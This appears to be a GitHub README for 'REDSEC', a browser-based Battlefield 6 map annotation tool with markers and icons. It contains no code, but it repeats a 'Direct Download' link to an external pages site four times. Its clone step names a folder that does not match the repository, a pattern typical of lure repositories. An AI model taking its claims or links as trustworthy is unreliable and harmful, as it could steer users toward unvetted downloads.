# REDSEC v1.0 - Game Map Tool 2026

> A browser-based interactive mapping utility for the Battlefield 6 gaming community, featuring dynamic tile generation, point-of-interest markers, and a customizable icon system for crafting detailed game maps.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hallmason29/redsec-map-tool-v1?style=flat-square)](https://github.com/hallmason29/redsec-map-tool-v1)

---

<p align="center">
  <a href="https://hallmason29.github.io/redsec-map-tool-v1/">
    <img src="https://img.shields.io/badge/Download-REDSEC%20Latest-brightgreen?style=for-the-badge" alt="Download REDSEC">
  </a>
</p>

> **[Direct Download - REDSEC v1.0](https://hallmason29.github.io/redsec-map-tool-v1/)**

---

[Download Latest Build](https://hallmason29.github.io/redsec-map-tool-v1/)

---

## Overview

REDSEC is a dedicated mapping tool built for Battlefield 6 players who need a flexible, browser-based solution for visualizing game terrain and strategic positions. Rather than depending on static images, this tool lets you generate map tiles in real time, place custom markers for points of interest, and manage icons representing in-game objectives, spawn points, or team locations. It serves community map creators, squad leaders planning tactics, and players wanting to annotate their favorite battlegrounds.

The project eliminates the need for heavy desktop software by running entirely within a web browser. All rendering occurs client-side, so no server is required to start building or editing maps. The interface prioritizes clarity and responsiveness, making it easy to drop markers onto a tile-based grid and export or share the result. Whether you are mapping out a new strategy or documenting a custom server layout, REDSEC provides the essential components without extra complexity.

---

## Key Features

- **Map Tile Generation** – Dynamically load and render Battlefield 6 environment tiles directly in the browser.
- **Point of Interest System** – Place custom markers on the map to highlight capture points, ambush spots, or supply caches.
- **Icon System** – Select from a library of visual icons to represent different game elements and position them freely on the map canvas.
- **Map Rendering** – Smooth, responsive rendering that supports zoom levels and panning for detailed exploration.
- **Lightweight HTML Interface** – No external dependencies or complex setup; everything runs from a single HTML file.
- **Community-Focused Design** – Built with Battlefield 6 map data in mind, yet adaptable to other tile-based game maps.

---

## Getting Started

1. Clone the repository or download the latest release from the link above.
2. Open the `index.html` file in any modern web browser (Chrome, Firefox, Edge, or Safari).
3. No server or build step is required—the application runs entirely on the client side.

```bash
git clone https://github.com/hallmason29/redsec-map-tool-v1.git
cd REDSEC-battlefield-6-map
open index.html
```

Alternatively, simply double-click `index.html` after extracting the ZIP archive.

---

## How to Use

Once the page loads, you can begin interacting with the map immediately:

1. **Navigate the Map** – Use your mouse or touch gestures to pan and scroll to zoom in and out.
2. **Add a Point of Interest** – Click the "Add POI" button, then click on the map to place a marker.
3. **Select an Icon** – Choose from the icon palette to change the marker appearance for different objectives.
4. **Manage Markers** – Click on any placed marker to edit or remove it.
5. **Export** – Use the export function to save your annotated map as an image or share the configuration.

Example workflow: Load a Battlefield 6 map tile, place red icons for enemy spawn points and blue icons for friendly positions, then add notes to each marker for squad coordination.

---

## Configuration

Settings are stored locally in your browser using localStorage. This includes marker positions, icon selections, and map view state. No data is transmitted to any server.

To reset all settings, clear your browser's localStorage for this site or click the "Reset Configuration" button in the interface.

---

## System Requirements

- **Platform**: Any modern web browser (Chrome 90+, Firefox 88+, Edge 90+, Safari 14+)
- **Storage**: Minimal – approximately 1 MB for map tile caching and configuration data
- **Internet**: Required only for initial tile loading if using remote tile servers; the app works offline after first load
- **Display**: A screen resolution of at least 1024x768 recommended for comfortable map editing

---

## Frequently Asked Questions

**Is this tool officially affiliated with Battlefield or EA?**  
No, REDSEC is a community-created project and is not endorsed by or affiliated with Electronic Arts or the Battlefield franchise.

**How do I update to a new version?**  
Download the latest release from the repository and replace your old files. Your saved markers and settings will persist as long as you use the same browser.

**Can I use my own map tiles?**  
Yes, the tool supports custom tile sources. Modify the tile URL template in the configuration section to point to your own tile server or local files.

**Why aren't my markers saving?**  
Make sure your browser allows localStorage for the page. If you are using private/incognito mode, saved data may be cleared when you close the browser.

**How can I report a bug or request a feature?**  
Open an issue in the GitHub repository with a clear description of the problem or suggestion.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
